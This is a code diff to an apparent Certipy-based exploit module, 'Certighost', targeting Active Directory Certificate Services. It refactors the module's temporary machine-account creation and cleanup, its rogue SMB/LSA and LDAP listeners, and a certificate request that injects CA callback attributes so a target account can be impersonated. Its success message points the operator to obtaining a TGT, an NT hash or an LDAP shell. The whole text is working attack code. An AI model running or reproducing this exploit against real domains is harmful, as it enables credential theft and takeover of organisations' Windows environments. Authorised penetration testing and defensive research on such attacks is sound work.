@@ -5,7 +5,6 @@ import copy
 import random
 import secrets
 import string
-import threading
 from typing import Optional, Tuple
 
 from impacket.dcerpc.v5.dtypes import RPC_SID
@@ -13,11 +12,12 @@ from ldap3.utils.conv import escape_filter_chars
 
 from certipy.commands.account import Account
 from certipy.lib.certighost import (
+    CertighostListenerManager,
     RogueLDAP,
+    SMBLSAListener,
+    check_listener_ports_available,
     detect_listener_ip,
     password_to_nthash,
-    serve_lsa_over_smb,
-    wait_for_listeners,
 )
 from certipy.lib.ldap import LDAPConnection, LDAPEntry
 from certipy.lib.logger import logging
@@ -55,6 +55,7 @@ class Certighost:
         self.kwargs = kwargs
         self._connection: Optional[LDAPConnection] = None
         self.created_computer = False
+        self._temporary_account: Optional[Account] = None
 
     @property
     def connection(self) -> LDAPConnection:
@@ -164,16 +165,40 @@ class Certighost:
             passw=password,
             connection=self.connection,
         )
-        if not account.create():
+        if not account.create_temporary():
             raise RuntimeError("Failed to create a machine account")
         self.created_computer = True
+        self._temporary_account = account
         self.computer_name = name
         self.computer_password = password
         return name, password, password_to_nthash(password)
 
     def _cleanup(self) -> None:
-        if not self.created_computer or self.no_cleanup or not self.computer_name:
+        if not self.created_computer or not self.computer_name:
             return
+        if self._temporary_account is not None:
+            try:
+                removed = self._temporary_account.close_temporary(
+                    delete=not self.no_cleanup
+                )
+            except Exception as error:
+                logging.warning(
+                    f"Could not remove temporary machine account "
+                    f"{self.computer_name!r}: {error}"
+                )
+                return
+            if self.no_cleanup:
+                logging.info(
+                    f"Preserved temporary machine account {self.computer_name!r}"
+                )
+            elif removed:
+                logging.info(
+                    f"Removed temporary machine account {self.computer_name!r}"
+                )
+            return
+        if self.no_cleanup:
+            return
+
         computer = self.connection.get_user(self.computer_name, silent=True)
         if computer is None:
             return
@@ -201,6 +226,16 @@ class Certighost:
 
         logging.info(f"Targeting {target_sam!r} ({target_dns})")
         logging.info(f"Using CA {ca_name!r} at {ca_host!r} ({ca_ip})")
+        unavailable_ports = check_listener_ports_available()
+        if unavailable_ports:
+            ports = ", ".join(str(port) for port in unavailable_ports)
+            raise RuntimeError(
+                f"Required listener port(s) {ports} are unavailable. Stop the "
+                "conflicting service and ensure this command has elevated privileges."
+            )
+
+        listeners: Optional[CertighostListenerManager] = None
+
         logging.info(f"CA callback address is {listener!r}")
 
         try:
@@ -211,20 +246,6 @@ class Certighost:
                 raise RuntimeError("Could not determine the domain SID")
 
             logging.info("Starting Certighost SMB/LSA and LDAP listeners")
-            threading.Thread(
-                target=serve_lsa_over_smb,
-                kwargs={
-                    "bind_address": "0.0.0.0",
-                    "domain": domain,
-                    "domain_guid": self._domain_guid(),
-                    "domain_sid": domain_sid,
-                    "computer_name": computer_name,
-                    "computer_hash": computer_hash,
-                    "computer_password": computer_password,
-                    "dc_ip": self.target.dc_ip,
-                },
-                daemon=True,
-            ).start()
             ldap_server = RogueLDAP(
                 domain,
                 computer_name,
@@ -234,16 +255,18 @@ class Certighost:
                 target_dns,
                 target_sam,
             )
-            threading.Thread(
-                target=ldap_server.serve,
-                kwargs={"bind_address": "0.0.0.0"},
-                daemon=True,
-            ).start()
-            if not wait_for_listeners():
-                raise RuntimeError(
-                    "The SMB/LDAP listeners did not start. Ports 445 and 389 "
-                    "must be available, and elevated privileges may be required."
-                )
+            smb_server = SMBLSAListener(
+                bind_address="0.0.0.0",
+                domain=domain,
+                domain_guid=self._domain_guid(),
+                domain_sid=domain_sid,
+                computer_name=computer_name,
+                computer_hash=computer_hash,
+                computer_password=computer_password,
+                dc_ip=self.target.dc_ip,
+            )
+            listeners = CertighostListenerManager(ldap_server, smb_server)
+            listeners.start()
 
             machine_target = copy.copy(self.target)
             machine_target.username = computer_name
@@ -263,22 +286,29 @@ class Certighost:
                 ca=ca_name,
                 template=self.template,
                 dns=f"{computer_name.rstrip('$')}.{domain}",
-                attribute=[f"cdc:{listener}", f"rmd:{target_dns}"],
+                additional_attributes=[f"cdc:{listener}", f"rmd:{target_dns}"],
                 out=output,
+                prompt_for_pending_key=False,
             )
             result = request.request()
-            if result is False:
+            listeners.raise_if_failed()
+            if not isinstance(result, tuple):
                 logging.error(
                     "Certighost request failed. The CA may be patched, chase may "
                     "be disabled, or the selected template may be unsuitable."
                 )
                 return False
+            _, saved_path = result
             logging.info(
-                "Certighost certificate obtained. Use 'certipy auth -pfx "
-                f"{output}.pfx -dc-ip {self.target.dc_ip}' to validate it."
+                f"Certighost certificate obtained at {saved_path!r}. Use "
+                f"'certipy auth -pfx {saved_path} -dc-ip {self.target.dc_ip}' "
+                "to obtain a TGT and NT hash, or add '-ldap-shell' to open an "
+                "LDAP shell."
             )
             return True
         finally:
+            if listeners is not None:
+                listeners.stop()
             self._cleanup()
 
 
@@ -286,5 +316,4 @@ def entry(options: argparse.Namespace) -> None:
     target = Target.from_options(options, dc_as_target=True)
     options.__delattr__("target")
     exploit = Certighost(target, **vars(options))
-    if not exploit.run():
-        raise SystemExit(1)
+    _ = exploit.run()
